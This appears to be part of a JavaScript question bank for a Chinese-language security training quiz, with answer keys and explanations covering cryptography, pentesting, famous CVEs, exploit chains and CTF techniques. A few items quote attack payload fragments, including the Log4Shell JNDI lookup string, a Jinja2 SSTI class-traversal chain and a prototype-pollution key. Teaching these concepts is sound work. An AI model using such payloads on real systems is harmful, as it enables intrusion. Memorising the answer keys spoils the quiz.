  { id:"xc20", cat:"crypto", level:"初级", q:"前向保密(forward secrecy)指？", options:["会话密钥不依赖长期私钥，泄露长期密钥也不能解密旧会话","更快","无密钥","对称"], answer:0, explain:"每次会话用临时密钥，长期私钥泄露也无法解密既往通信内容。" },
  { id:"xc21", cat:"crypto", level:"初级", q:"HMAC 是？", options:["基于哈希的消息认证码","对称加密","数字签名","随机数"], answer:0, explain:"HMAC 用密钥与哈希构造 MAC，提供完整性+认证，且抗长度扩展。" },
  { id:"xc22", cat:"crypto", level:"初级", q:"长度扩展攻击影响？", options:["Merkle-Damgård 哈希(MD5/SHA1/SHA2)，HMAC 免疫","AES","RSA","ECC"], answer:0, explain:"M-D 结构允许在已知哈希后追加数据并算出新哈希；HMAC 通过嵌套结构免疫。" },
  // ---- 密码学 · 中级 ----
  { id:"xc23", cat:"crypto", level:"中级", q:"TLS 的 Heartbleed 是？", options:["OpenSSL 心跳扩展越界读，泄露内存","加密弱","降级","MITM"], answer:0, explain:"心跳请求未校验长度，可读取进程内存，泄露私钥与会话数据。" },
  { id:"xc24", cat:"crypto", level:"中级", q:"POODLE 攻击针对？", options:["强制降级到 SSLv3 利用 CBC 弱点","AES","RSA","ECC"], answer:0, explain:"POODLE 诱使客户端用已不安全的 SSLv3，再利用 CBC 处理缺陷解密字节。" },
  { id:"xc25", cat:"crypto", level:"中级", q:"ECDSA 若随机数 k 重用会？", options:["可恢复私钥","提速","压缩","加密"], answer:0, explain:"同一 k 签两份不同消息会联立方程解出私钥，是真实重大事故根源。" },
  { id:"xc26", cat:"crypto", level:"中级", q:"DHE/ECDHE 提供？", options:["临时密钥交换，支持前向保密","对称加密","静态密钥","无密钥"], answer:0, explain:"临时(Ephemeral)密钥每次协商新密钥，实现前向保密。" },
  { id:"xc27", cat:"crypto", level:"中级", q:"证书固定(cert pinning)用途？", options:["绑定预期公钥/证书，防伪造 CA 中间人","加速","压缩","加密 cookie"], answer:0, explain:"pinning 只信任预定证书/公钥，即使被植入恶意 CA 也无法中间人。" },
  { id:"xc28", cat:"crypto", level:"中级", q:"RSA 私钥 d 过小时可用？", options:["Wiener 攻击恢复私钥","提速","压缩","加密"], answer:0, explain:"d 过小（与 N 相比）时连分数攻击可恢复私钥，应使用足够大的 d。" },
  { id:"xc29", cat:"crypto", level:"中级", q:"TLS 中间人成功常因？", options:["证书校验缺失/被禁或伪造 CA 被信任","HTTPS","HSTS","pinning"], answer:0, explain:"只要客户端不严格校验证书或信任了攻击者 CA，就能透明中间人解密。" },
  { id:"xc30", cat:"crypto", level:"中级", q:"对称加密 vs 非对称加密，非对称主要缺点？", options:["运算慢、适合小数据/密钥交换","不需要密钥","最安全","最快"], answer:0, explain:"非对称运算开销大，通常用于协商对称密钥或签名，而非大量数据加密。" },
  // ---- 渗透测试 · 入门 ----
  { id:"xp1", cat:"pentest", level:"入门", q:"被动侦察指？", options:["不接触目标(WHOIS/证书透明/搜索引擎缓存)","端口扫描","漏洞利用","提权"], answer:0, explain:"被动侦察尽量不触碰目标，降低被发现与封禁风险。" },
  { id:"xp2", cat:"pentest", level:"入门", q:"主动侦察指？", options:["直接扫描/探测目标(可能留下痕迹)","只查公开资料","社工","报告"], answer:0, explain:"主动侦察会向目标发流量（扫描/探测），效率高但有痕迹。" },
  { id:"xp3", cat:"pentest", level:"入门", q:"nmap -sS 是？", options:["SYN 半开扫描","全连接","UDP","版本"], answer:0, explain:"-sS 只完成三次握手前两步便重置，隐蔽且快，是最常用扫描方式。" },
  { id:"xp4", cat:"pentest", level:"入门", q:"nmap -sV 用于？", options:["探测服务/版本","操作系统","只 ping","清理"], answer:0, explain:"-sV 主动探测 banner 以识别服务类型与版本，辅助匹配漏洞。" },
  { id:"xp5", cat:"pentest", level:"入门", q:"目录爆破(gobuster/ffuf)用于？", options:["发现隐藏路径/文件","加密","提权","报告"], answer:0, explain:"用字典枚举路径，常能找到后台、备份、接口等未链接资产。" },
  { id:"xp6", cat:"pentest", level:"入门", q:"子域枚举常用？", options:["字典/证书透明(DNS)/搜索引擎","仅 ping","仅 nmap","仅社工"], answer:0, explain:"证书透明日志、DNS 字典与搜索引擎是子域发现的常用手段。" },
  { id:"xp7", cat:"pentest", level:"入门", q:"漏洞扫描器(Nessus/OpenVAS)应在？", options:["明确授权范围内使用","任意目标","生产无告知","公网随意"], answer:0, explain:"未经授权的扫描可能违法或影响业务，必须在书面授权范围内进行。" },
  { id:"xp8", cat:"pentest", level:"入门", q:"渗透测试方法论顺序通常？", options:["侦察→扫描→利用→提权→持久化→报告","报告→利用→侦察","只利用","只扫描"], answer:0, explain:"标准流程从信息收集到利用再到后渗透与交付报告，循序渐进。" },
  { id:"xp9", cat:"pentest", level:"入门", q:"CVSS 用于？", options:["量化漏洞严重程度/评分","加密","扫描","提权"], answer:0, explain:"CVSS 用向量给出 0-10 的基线分，便于统一排优先级。" },
  { id:"xp10", cat:"pentest", level:"入门", q:"MITRE ATT&CK 是？", options:["攻防战术与技术知识库","扫描器","加密","操作系统"], answer:0, explain:"ATT&CK 整理真实对抗中的战术/技术，常用于红蓝映射与检测建设。" },
  // ---- 渗透测试 · 初级 ----
  { id:"xp11", cat:"pentest", level:"初级", q:"Linux 提权常见途径？", options:["sudo 配置错误/SUID/ cron/内核漏洞","换浏览器","重装","关防火墙"], answer:0, explain:"滥用错误 sudo 规则、SUID 二进制、定时任务与内核漏洞是常见提权点。" },
  { id:"xp12", cat:"pentest", level:"初级", q:"Windows 提权常见途径？", options:["未引号路径服务/令牌 impersonation/ GPP 密码","换桌面","重装","关杀软"], answer:0, explain:"不当服务路径、令牌模拟与组策略首选项里存的密码都是经典提权面。" },
  { id:"xp13", cat:"pentest", level:"初级", q:"Pass-the-Hash 指？", options:["用 NTLM 哈希直接认证，无需明文密码","重装","换 IP","加密"], answer:0, explain:"Windows 认证用哈希而非明文，拿到哈希即可直接认证，无需破解。" },
  { id:"xp14", cat:"pentest", level:"初级", q:"Kerberoasting 指？", options:["请求服务票据离线爆破服务账户口令","换密码","提权内核","扫描"], answer:0, explain:"攻击者请求服务票据，其可用服务账户弱口令离线爆破，得到域内权限。" },
  { id:"xp15", cat:"pentest", level:"初级", q:"横向移动常用？", options:["SMB/PsExec/ Pass-the-Hash/ WMI","重装","关机","报告"], answer:0, explain:"在内网用共享/远程管理协议与哈希复用，从一台主机移动到另一台。" },
  { id:"xp16", cat:"pentest", level:"初级", q:"凭证获取 Linux 看？", options:["/etc/shadow、进程内存、配置中的明文","只有浏览器","注册表","BIOS"], answer:0, explain:"口令哈希在 /etc/shadow，运行中进程与配置文件也可能泄露明文凭据。" },
  { id:"xp17", cat:"pentest", level:"初级", q:"黄金票据(Golden Ticket)利用？", options:["krbtgt 哈希伪造任意 TGT 长期控域","换密码","扫描","提权内核"], answer:0, explain:"掌握 krbtgt 密钥即可签发任意用户的 TGT，实现域控持久化。" },
  { id:"xp18", cat:"pentest", level:"初级", q:"钓鱼(phishing)属于？", options:["社会工程，诱导目标执行/泄露","扫描","加密","内核"], answer:0, explain:"钓鱼利用心理与信任诱使目标点击/提供凭证，是社会工程典型手段。" },
  { id:"xp19", cat:"pentest", level:"初级", q:"C2(命令与控制)框架如？", options:["Cobalt Strike/Metasploit(授权内)","浏览器","编辑器","防火墙"], answer:0, explain:"C2 框架用于在被控主机与攻击端间建立受控通道，须在授权范围内使用。" },
  { id:"xp20", cat:"pentest", level:"初级", q:"红队与蓝队区别？", options:["红队攻、蓝队防，对抗式演练","都是防守","都是扫描","都是报告"], answer:0, explain:"红队模拟攻击者，蓝队防守检测响应，联合演练提升真实防护能力。" },
  // ---- 渗透测试 · 中级 ----
  { id:"xp21", cat:"pentest", level:"中级", q:"威胁狩猎(threat hunting)指？", options:["主动在环境中寻找已绕过防御的威胁","被动等告警","扫描外网","加密"], answer:0, explain:"狩猎假设防御已被绕过，主动用数据与情报揪出潜伏威胁。" },
  { id:"xp22", cat:"pentest", level:"中级", q:"SIEM 用途？", options:["集中日志与安全事件关联分析","加密","扫描","提权"], answer:0, explain:"SIEM 汇聚多源日志并做关联，帮助发现横向移动等攻击链。" },
  { id:"xp23", cat:"pentest", level:"中级", q:"域渗透中 BloodHound 用于？", options:["可视化 AD 权限关系，找最短提权路径","扫描端口","加密","报告"], answer:0, explain:"BloodHound 以图展示 AD 对象关系，快速定位到域管的攻击路径。" },
  { id:"xp24", cat:"pentest", level:"中级", q:"渗透报告应包含？", options:["风险等级/复现步骤/影响/修复建议","只给分数","只给密码","只给 IP"], answer:0, explain:"好报告要让客户能复现并修复，需含严重度、证据、影响与整改建议。" },
  { id:"xp25", cat:"pentest", level:"中级", q:"范围界定(scoping)重要性？", options:["明确授权边界，避免越权/违法","加快","加密","扫描"], answer:0, explain:"清晰的范围与授权是合法测试前提，越界可能构成违法或影响业务。" },
  { id:"xp26", cat:"pentest", level:"中级", q:"社会工程手法包括？", options:["pretexting/ baiting/ 钓鱼 等","端口扫描","加密","内核"], answer:0, explain:"社会工程靠人为弱点而非技术漏洞，包含伪装、诱饵、钓鱼等。" },
  { id:"xp27", cat:"pentest", level:"中级", q:"物理安全测试包括？", options:["尾随/USB drop/门禁测试","只扫 Web","只加密","只报告"], answer:0, explain:"物理层面也是攻击面，尾随进门、丢 U 盘等可突破逻辑防线。" },
  { id:"xp28", cat:"pentest", level:"中级", q:"漏洞验证(PoC)与利用区别？", options:["PoC 证明存在且不造成破坏，利用可能深入","一样","PoC 更危险","利用更安全"], answer:0, explain:"PoC 仅需证明可行性并尽量不破坏系统，正式利用才会进一步深入。" },
  { id:"xp29", cat:"pentest", level:"中级", q:"WAF 属于？", options:["防御层，过滤恶意 Web 流量","攻击工具","扫描器","加密"], answer:0, explain:"WAF 在应用前过滤恶意请求，是 Web 防护的重要一层（非万能）。" },
    { id:"xp30", cat:"pentest", level:"中级", q:"日志分析可发现？", options:["异常登录/横向移动痕迹","加密","扫描端口","内核版本"], answer:0, explain:"登录时间异常、非常见源 IP 的横向连接等是入侵在日志中的典型信号。" },

  // ===================== 高级(CTF)档位：真实 CVE 分析 / 综合利用链 / CTF 专项 =====================
  // ---- 高级 · 真实 CVE 漏洞分析 ----
  { id:"av1", cat:"crypto", level:"高级", q:"CVE-2014-0160（Heartbleed）的漏洞本质是？", options:["OpenSSL TLS 心跳扩展未校验长度导致越界读内存","SSH 弱口令","SQL 注入","XSS"], answer:0, explain:"心跳请求声称的长度大于实际负载，服务端按声称长度回显，越界读取进程内存（含私钥）。", hint:"关注“声称的长度”与实际负载长度不一致。" },
  { id:"av2", cat:"web", level:"高级", q:"Shellshock（CVE-2014-6271）的触发面是？", options:["Bash 环境变量中以 `() {` 开头却仍执行尾随命令","内核提权","浏览器漏洞","DNS 投毒"], answer:0, explain:"CGI 等会把 HTTP 头写入环境变量再交给 bash，尾随命令被当作函数体执行，造成 RCE。", hint:"CGI 脚本会把 HTTP 头塞进环境变量传给 bash。" },
  { id:"av3", cat:"binary", level:"高级", q:"Dirty COW（CVE-2016-5195）属于？", options:["Linux 内核写时复制(COW)竞态导致的本地提权","远程 RCE","XSS","密码学缺陷"], answer:0, explain:"竞态让只读映射被写成可写，攻击者可改 /etc/passwd 等拿到 root。", hint:"目标是写原本只读的系统文件。" },
  { id:"av4", cat:"binary", level:"高级", q:"EternalBlue（MS17-010）利用的组件是？", options:["Windows SMBv1 的漏洞","OpenSSL","Apache","Nginx"], answer:0, explain:"SMBv1 处理畸形报文时的漏洞，可被用于远程代码执行，WannaCry 即借其传播。", hint:"与 WannaCry 勒索蠕虫同源。" },
  { id:"av5", cat:"binary", level:"高级", q:"BlueKeep（CVE-2019-0708）的显著特征是？", options:["RDP 预认证远程代码执行","需登录后才能触发","仅信息泄露","SQL 注入"], answer:0, explain:"无需账号即可在 RDP 预认证阶段触发 RCE，危害类似 WannaCry 级蠕虫。", hint:"无需账号即可触发。" },
  { id:"av6", cat:"web", level:"高级", q:"Log4Shell（CVE-2021-44228）的触发点是？", options:["Log4j 2 的 JNDI 查找 `${jndi:ldap://...}` 解析不可信日志","SSH 配置错误","DNS 污染","XSS"], answer:0, explain:"任何被记录的不可信字符串里的 JNDI 占位符都会被解析，从远程加载类实现 RCE。", hint:"日志内容里出现该占位符就会被解析。" },
  { id:"av7", cat:"web", level:"高级", q:"Spring4Shell（CVE-2022-22965）的利用关键在？", options:["通过数据绑定访问 getClass().classLoader 修改 Tomcat 写入 webshell","SQL 注入","XSS","CSRF"], answer:0, explain:"Spring Bean 的数据绑定越过了对象边界，可借 classLoader 写文件实现 RCE。", hint:"数据绑定越过了对象属性边界。" },
  { id:"av8", cat:"web", level:"高级", q:"Drupalgeddon2（CVE-2018-7600）属于？", options:["Drupal 请求参数处理导致的远程代码执行","XSS","CSRF","SQL 注入"], answer:0, explain:"未过滤的数组/属性被当作命令执行，攻击者可直接 RCE。", hint:"与“未过滤的数组/属性被当作命令执行”有关。" },
  { id:"av9", cat:"web", level:"高级", q:"Struts2 S2-045（CVE-2017-5638）的根因是？", options:["Jakarta Multipart 解析器的 OGNL 表达式注入","CSRF","XSS","SSRF"], answer:0, explain:"上传/错误页处理时执行了攻击者可控的 OGNL 表达式，导致 RCE。", hint:"错误页处理执行了可控的 OGNL。" },
  { id:"av10", cat:"binary", level:"高级", q:"Spectre（CVE-2017-5715/5753）利用的是？", options:["CPU 投机执行(speculative execution)侧信道越权读内存","磁盘加密缺陷","SQL 注入","XSS"], answer:0, explain:"错误的投机执行路径会留下缓存痕迹，借此跨进程读敏感内存。", hint:"错误的投机执行会留下缓存痕迹。" },
  { id:"av11", cat:"binary", level:"高级", q:"Meltdown（CVE-2017-5754）与 Spectre 主要区别？", options:["直接跨越内核/用户态边界读内核内存","只影响浏览器","仅网络层","XSS"], answer:0, explain:"Meltdown 利用权限检查被推迟，用户态可直接读内核内存，需 KPTI 缓解。", hint:"需 KPTI/隔离页表缓解。" },
  { id:"av12", cat:"pentest", level:"高级", q:"Zerologon（CVE-2020-1472）针对？", options:["Netlogon 协议，用全零 client credential 绕过认证接管域控","OpenSSL","Apache","SSH"], answer:0, explain:"Netlogon 认证对全零 IV 的 AES-CFB8 可被绕过，攻击者可重置域控机器账户密码。", hint:"与 AES-CFB8 IV 全零相关的认证绕过。" },
  { id:"av13", cat:"pentest", level:"高级", q:"PrintNightmare（CVE-2021-34527）利用的是？", options:["Windows 打印后台处理程序 RPRN RPC 未授权提权/RCE","浏览器漏洞","DNS 投毒","SQL 注入"], answer:0, explain:"通过 RPC 添加打印机驱动加载 DLL，实现提权与远程代码执行。", hint:"通过 RPC 添加打印机驱动加载 DLL。" },
  { id:"av14", cat:"web", level:"高级", q:"ProxyLogon（CVE-2021-26855）链的起点通常是？", options:["Exchange 预认证 SSRF 抵达内部服务再序列化 RCE","钓鱼邮件","XSS","CSRF"], answer:0, explain:"先用 SSRF 绕过认证访问内部接口，再借序列化等拿到 RCE。", hint:"先“绕过认证”访问内部接口。" },
  { id:"av15", cat:"crypto", level:"高级", q:"POODLE（CVE-2014-3566）迫使客户端降级到？", options:["SSLv3 再利用其 CBC 处理弱点","TLS1.3","AES-GCM","RSA"], answer:0, explain:"降级到 SSLv3 后利用 CBC 实现缺陷逐字节恢复明文。", hint:"旧协议 CBC 实现存在可攻击点。" },
  { id:"av16", cat:"crypto", level:"高级", q:"FREAK（CVE-2015-0204）利用的是？", options:["可降级到出口级(export-grade)弱 RSA 密钥协商","Heartbeat","XSS","DNS 污染"], answer:0, explain:"中间人让服务端使用短密钥，随后可离线分解恢复会话密钥。", hint:"中间人让服务端用弱密钥。" },
  { id:"av17", cat:"crypto", level:"高级", q:"ROBOT（CVE-2017-6168 等）是？", options:["RSA PKCS#1 v1.5 填充的计时/报错预言机攻击","AES 侧信道","XSS","SQL 注入"], answer:0, explain:"利用解密“预言机”（响应差异）辅助恢复明文或签名。", hint:"解密“预言机”可辅助解密。" },
  { id:"av18", cat:"web", level:"高级", q:"Log4Shell 的最佳修复思路是？", options:["升级 Log4j2 并禁用 JNDI 远程查找/格式消息","仅关日志","更换数据库密码","仅靠 WAF 即可"], answer:0, explain:"根因在 JNDI 查找，应升级并关闭远程查找；WAF 只能拦已知 payload，不解决根因。", hint:"WAF 只拦已知 payload，根因在 JNDI 查找。" },
  // ---- 高级 · 综合利用链(exploit chain) ----
  { id:"av19", cat:"binary", level:"高级", q:"一个典型的浏览器利用链顺序是？", options:["渲染进程漏洞(RCE)→沙箱逃逸→提权到系统","提权→沙箱逃逸→RCE","反序三步","仅 XSS"], answer:0, explain:"先在被攻击进程拿代码执行，再逃逸沙箱、提权，形成完整链。", hint:"先在渲染进程拿代码执行，再逃沙箱。" },
  { id:"av20", cat:"pentest", level:"高级", q:"Web 应用 RCE → 域控 的常见链是？", options:["Web RCE 读凭据→Pass-the-Hash/票据→Kerberoasting→域控","直接 XSS","仅 SQL 注入","仅钓鱼"], answer:0, explain:"从主机落到身份，再用 Windows 认证链横向到域控。", hint:"从“机”到“身份”再到“域”。" },
  { id:"av21", cat:"pentest", level:"高级", q:"钓鱼邮件→内网横向 的下一步通常是？", options:["在主机落 C2 信标→侦察→凭据窃取→横向移动","直接 DDoS","仅发勒索信","关闭防火墙"], answer:0, explain:"先建立据点(foothold)，再在内网扩展与移动。", hint:"先 establish foothold 再 move。" },
  { id:"av22", cat:"pentest", level:"高级", q:"利用链中“沙箱逃逸”的作用是？", options:["突破渲染/低权限容器限制，获更高权限与更广访问","提速","压缩","加密"], answer:0, explain:"不逃逸则攻击停留在受限进程，无法进一步控制主机。", hint:"否则只在受限进程内。" },
  { id:"av23", cat:"pentest", level:"高级", q:"阻断利用链最有效的方法通常是？", options:["在链的某一环做检测/加固，使其断裂","只打补丁最后一步","只告警","只加密"], answer:0, explain:"链只要断任一环节就整体失效，纵深防御即此意。", hint:"链只要断一环就失效。" },
  { id:"av24", cat:"pentest", level:"高级", q:"“左移”防御利用链的思路是？", options:["在开发/构建期消除漏洞根源，减少可被利用的起点","只靠 WAF","只靠 EDR","只靠审计日志"], answer:0, explain:"减少可被利用的环节数，比事后拦截更根本。", hint:"减少可被利用的环节数。" },
  { id:"av25", cat:"pentest", level:"高级", q:"持久化(persistence)在利用链中的位置？", options:["提权/立足之后，保证能重新进入","第一步","仅侦察阶段","报告阶段"], answer:0, explain:"拿到权限后建立后门，保证失陷主机可被再次访问。", hint:"在拿到权限后建立“后门”。" },
  { id:"av26", cat:"web", level:"高级", q:"针对“SSRF→云元数据→临时凭证”链，防御应？", options:["禁止实例访问元数据/启用 IMDSv2/网络隔离","只用 HTTPS","加 WAF","更换密码"], answer:0, explain:"断掉“拿凭证”这一环（强制 PUT 令牌、禁止链路本地访问）。", hint:"断掉“拿凭证”这一环。" },
  { id:"av27", cat:"pentest", level:"高级", q:"利用链分析里“攻击面(attack surface)”指？", options:["所有可达且可被滥用入口的集合，链往往从这些入口开始","仅开放端口","仅网页","仅 API"], answer:0, explain:"入口越多，链越容易起手；收敛攻击面是降风险的关键。", hint:"入口越多链越容易起。" },
  { id:"av28", cat:"pentest", level:"高级", q:"红队评估利用链时关注“爆破半径(blast radius)”是为了？", options:["评估单点失陷后的影响范围，优先修复高杠杆环节","提速","压缩","加密"], answer:0, explain:"判断哪个环节最致命，优先加固以缩短潜在影响。", hint:"判断哪个环节最致命。" },
  { id:"av29", cat:"pentest", level:"高级", q:"防御利用链时“最小权限(least privilege)”的作用是？", options:["让单点失陷难以横向/提权，缩短链","提速","压缩","加密"], answer:0, explain:"即使某一环被突破，缺乏额外权限也让后续链难以延续。", hint:"让单点失陷难以横向/提权。" },
  { id:"av30", cat:"pentest", level:"高级", q:"利用链里“信任边界(trust boundary)穿越”意味着？", options:["数据/控制流跨过本不应跨的安全域，常是链的转折点","仅网络层","仅网页","仅 API"], answer:0, explain:"一旦越界，后续往往可用目标身份做更多事，是链的关键转折。", hint:"跨过本不应跨的安全域。" },
  // ---- 高级 · CTF 专项(pwn/web/crypto/reverse/misc) ----
  { id:"av31", cat:"binary", level:"高级", q:"64 位程序开启 NX+PIE+Canary+FULL RELRO，存在格式化字符串泄露与栈溢出，正确思路？", options:["先用格式化串泄露 libc 基址与 canary，再用 ROP(ret2libc)拿 shell","直接覆盖 GOT","直接跳 system","无需任何泄露"], answer:0, explain:"FULL RELRO 下 GOT 只读不可改，只能靠泄露地址后 ROP 调用 libc 函数。", hint:"FULL RELRO 不能改 GOT，靠 ROP。" },
  { id:"av32", cat:"binary", level:"高级", q:"ret2csu 在 64 位利用中用于？", options:["利用 __libc_csu_init 的 gadget 设置寄存器后调用任意函数","加密","压缩","提速"], answer:0, explain:"当找不到直接 gadget 时，可借这段通用 gadget 布置 rdi/rsi/rdx 等再 call。", hint:"找不到直接 gadget 时借这段通用 gadget。" },
  { id:"av33", cat:"binary", level:"高级", q:"tcache poisoning 的目标是？", options:["制造重叠块以覆写 __free_hook/目标指针实现任意写","提速","压缩","加密"], answer:0, explain:"通过构造重复节点，使 free 后写入的地址可控，从而改写关键函数指针。", hint:"控制 free 后写入的地址。" },
  { id:"av34", cat:"binary", level:"高级", q:"给定“使用后才释放”的 UAF，常见做法是？", options:["释放后保留指针，再次分配同尺寸块复用该内存改结构","立即置空指针","不利用","只读不改"], answer:0, explain:"复用已释放块可控制其中的类型/函数指针，造成类型混淆或劫持。", hint:"复用已释放块控制类型/函数指针。" },
  { id:"av35", cat:"web", level:"高级", q:"Jinja2 SSTI 读 flag 常用思路？", options:["借 `''.__class__.__mro__[1].__subclasses__()` 找到危险类(如 subprocess/os)执行命令","直接读文件","XSS","CSRF"], answer:0, explain:"从基础类型向上找可调用危险方法的类，进而执行系统命令。", hint:"从基础类型向上找可调用危险方法的类。" },
  { id:"av36", cat:"web", level:"高级", q:"PHP `==` 类型杂耍(type juggling)可导致？", options:["`0e123==0e999` 判等为真，绕过哈希/认证校验","提速","压缩","加密"], answer:0, explain:"数字字符串按数值比较，散列值恰为 0e… 时被当作 0 相等。", hint:"数字字符串按数值比较。" },
  { id:"av37", cat:"web", level:"高级", q:"原型链污染(prototype pollution)利用？", options:["覆写 Object.prototype 属性(如 __proto__.isAdmin=true)影响逻辑判定","XSS","CSRF","SQL 注入"], answer:0, explain:"通过 `.__proto__` 等键写进全局原型，影响后续所有对象的属性读取。", hint:"通过 `.__proto__` 等键写进全局原型。" },
  { id:"av38", cat:"web", level:"高级", q:"CTF 中“竞争条件”常用于？", options:["并发触发“先检查后使用”的兑换/上传/抽奖逻辑","提速","压缩","加密"], answer:0, explain:"在检查与使用之间插队，使越权状态成立。", hint:"在检查与使用之间插队。" },
  { id:"av39", cat:"web", level:"高级", q:"Java 反序列化 gadget chain(如 CommonsCollections)目的？", options:["通过可控属性链最终调用 Runtime.exec 实现 RCE","只读取","只存储","只加密"], answer:0, explain:"反序列化时自动调用 setter/读属性触发链条，末端执行命令。", hint:"反序列化时自动调用触发链，末端执行命令。" },
  { id:"av40", cat:"crypto", level:"高级", q:"同一明文用相同小公钥指数 e 对多个不同模数 N 加密(广播)，可用？", options:["中国剩余定理(CRT/Håstad)恢复明文","MD5","XSS","AES"], answer:0, explain:"同消息多模数下，联立同余可在不知私钥时解出明文（Håstad 广播攻击）。", hint:"同消息多模数 → 联立同余。" },
  { id:"av41", cat:"crypto", level:"高级", q:"CTR 模式两密文 nonce 相同且已知其中一份明文，可？", options:["异或两份密文得两份明文异或，再结合已知明文恢复另一份","无解","提速","压缩"], answer:0, explain:"流密码 keystream 复用 = 明文异或，已知一份即可解另一份。", hint:"流密码 keystream 复用 = 明文异或。" },
  { id:"av42", cat:"crypto", level:"高级", q:"ECB cut-and-paste 利用前提是？", options:["明文结构已知且按固定块对齐，可复制已知密文块拼接到自己数据","随机 IV","AEAD","流式加密"], answer:0, explain:"相同明文块=相同密文块，可像拼图一样重组出权限提升的密文。", hint:"相同明文块=相同密文块。" },
  { id:"av43", cat:"crypto", level:"高级", q:"padding oracle 在 CTF 中逐字节恢复需？", options:["从末块往前逐字节调整 IV 使填充为 0x01/0x02… 观察响应差异","提速","压缩","加密"], answer:0, explain:"利用填充校验是否正确的“预言机”逐字节反推明文。", hint:"利用填充校验是否正确的“预言机”。" },
  { id:"av44", cat:"crypto", level:"高级", q:"hash 长度扩展攻击(MD5/SHA1/SHA2)要求已知？", options:["原消息长度与原哈希(无需原消息内容)，即可在其后追加计算新哈希","明文","密钥","IV"], answer:0, explain:"Merkle-Damgård 压缩状态可接续，已知长度与哈希即可算 extension。", hint:"Merkle-Damgård 状态可接续。" },
  { id:"av45", cat:"binary", level:"高级", q:"逆向中 anti-debug 常见手段？", options:["ptrace 自检/定时器/断点检测阻止动态调试","只加密","只压缩","只提速"], answer:0, explain:"检测自身是否被调试，命中则走错误分支或退出。", hint:"检测自己是否被调试。" },
  { id:"av46", cat:"binary", level:"高级", q:"flag 常隐藏方式是？", options:["硬编码字符串/资源/需还原的编码常量(xor/Base64)","明文显示在标题","仅日志","仅网络"], answer:0, explain:"常需解码/还原（xor、Base64、自定义算法）才能拿到 flag。", hint:"需要解码/还原才能拿到。" },
  { id:"av47", cat:"pentest", level:"高级", q:"ReDoS 指？", options:["恶意正则灾难性回溯导致服务不可用(DoS)","加密弱","XSS","SQL 注入"], answer:0, explain:"嵌套量词叠加导致指数级回溯，构造输入即可打挂服务。", hint:"嵌套量词叠加导致指数级回溯。" },
  { id:"av48", cat:"pentest", level:"高级", q:"源码泄露如 .git 目录暴露可？", options:["恢复历史提交中的源码/密钥","只影响样式","仅日志","无影响"], answer:0, explain:".git 含完整版本历史，可翻出旧版漏洞与泄露的凭据。", hint:".git 含完整版本历史。" },

  // ===================== v1.5.1 扩充：网络 / 云原生 / 蓝队（原先这三个领域零题目） =====================
  { id:"np1", cat:"network", level:"入门", q:"以下哪种协议默认以明文传输凭据，风险最高？", options:["HTTPS","SSH","Telnet","SFTP"], answer:2, explain:"Telnet 明文传输账号口令与全部会话内容，应改用 SSH 等加密协议。" },
  { id:"np2", cat:"network", level:"入门", q:"TCP/IP 模型中，IP 协议主要负责？", options:["端到端可靠传输","寻址与路由","应用层加密","端口复用"], answer:1, explain:"IP 负责寻址与路由，可靠性由 TCP 提供，二者分层不同。" },
  { id:"np3", cat:"network", level:"初级", q:"TCP SYN 洪泛攻击（SYN Flood）利用的是？", options:["半连接队列被占满，导致正常连接无法建立","路由表被篡改","证书被替换","DNS 被投毒"], answer:0, explain:"攻击者只发 SYN 不回 ACK，占满服务端半连接队列；可用 SYN Cookie 缓解。" },
  { id:"np4", cat:"network", level:"初级", q:"SYN 半开扫描（nmap -sS）相比全连接扫描的特点是？", options:["必须完成三次握手","不完成握手，更快且更隐蔽","只能扫描 UDP","需要目标应用层认证"], answer:1, explain:"只发 SYN、收到 SYN/ACK 即回 RST，不在目标留下完整连接记录。" },
  { id:"np5", cat:"network", level:"初级", q:"nmap 中 -sV 参数的作用是？", options:["探测服务名称与版本","识别操作系统","执行漏洞利用脚本","指定端口范围"], answer:0, explain:"-sV 做服务与版本探测；-O 才是系统识别，-sC 执行默认脚本。" },
  { id:"np6", cat:"network", level:"初级", q:"对大型目标做资产测绘时，合理的执行顺序是？", options:["先快速全端口探测，再对开放端口做服务与版本识别","对全部端口都做深度版本探测","只扫常见 100 个端口就够了","先跑漏洞利用脚本"], answer:0, explain:"先粗后细控制时间成本；只扫常见端口会漏掉跑在非常规端口上的服务。" },
  { id:"np7", cat:"network", level:"中级", q:"在交换网络中实施中间人（MITM）最常用的手段是？", options:["ARP 欺骗，把网关 IP 映射到攻击者 MAC","爆破 Wi-Fi 口令","伪造 HTTPS 证书即可","必须物理接触交换机"], answer:0, explain:"伪造 ARP 应答即可让流量经过攻击者；HTTPS 只能保护内容，不能阻止流量被转发。" },
  { id:"np8", cat:"network", level:"中级", q:"防御 ARP 欺骗最有效的手段是？", options:["交换机开启 DHCP Snooping + 动态 ARP 检测（DAI）","启用 HTTPS","关闭 ICMP","更换交换机品牌"], answer:0, explain:"在接入层校验 IP-MAC 绑定并丢弃伪造 ARP 应答；HTTPS 不能阻止 ARP 欺骗本身。" },
  { id:"np9", cat:"network", level:"中级", q:"DNS 缓存投毒的核心目的是？", options:["把域名解析结果改为攻击者控制的地址","加密 DNS 查询","提升解析速度","隐藏服务器真实 IP"], answer:0, explain:"污染递归解析器缓存后可劫持大量用户访问；DNSSEC 与随机化查询 ID/端口可缓解。" },
  { id:"np10", cat:"network", level:"高级", q:"Pass-the-Hash 能够成立的根本原因是？", options:["NTLM 认证只依赖口令哈希，不需要明文口令","口令强度不足","域控未打补丁","未启用 HTTPS"], answer:0, explain:"拿到 NTLM 哈希即可直接用于认证；缓解方向是减少 NTLM、启用凭据保护与特权分层。" },
  { id:"np11", cat:"network", level:"高级", q:"内网横向移动中「凭据复用」最常见的来源是？", options:["本地管理员口令在多台机器上相同","浏览器书签","DNS 缓存","交换机 MAC 地址表"], answer:0, explain:"统一镜像带来统一本地管理员口令，攻陷一台等于攻陷一片；应用 LAPS 随机化本地口令。" },
  { id:"np12", cat:"network", level:"高级", q:"降低内网横向移动风险最有效的架构手段是？", options:["管理与特权分层 + 最小权限（LAPS、跳板机）","关闭 445 端口即可","全员改用 PIN 码","把口令长度提到 20 位"], answer:0, explain:"横向移动依赖可复用的高权限凭据与信任关系，分层管理直接切断复用链。" },
  { id:"np13", cat:"network", level:"高级", q:"Kerberoasting 的攻击对象是？", options:["带 SPN 的服务账户所请求的 TGS 票据","域用户明文口令","域控注册表文件","DNS 区域文件"], answer:0, explain:"任意域用户都能请求带 SPN 账户的 TGS，离线爆破其弱口令；应使用长随机口令与服务账户托管。" },
